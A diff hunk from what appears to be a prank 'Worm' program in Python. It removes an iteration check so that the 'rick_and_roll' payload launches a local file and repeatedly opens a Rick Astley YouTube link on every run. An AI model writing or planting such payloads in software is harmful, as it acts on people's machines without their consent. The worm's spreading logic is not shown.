@@ -153,11 +153,10 @@ class Worm:
     
     def rick_and_roll(self):
         try:
-            if self.iteration == 2:
-                os.startfile(self.own_path + RICKLOC)
-                if YOUTUBETOO:
-                    for i in range(0, COUNT):
-                        webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
+            os.startfile(self.own_path + RICKLOC)
+            if YOUTUBETOO:
+                for i in range(0, COUNT):
+                    webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
         except:
             logging.warning("exception occurred: no rick?")
 
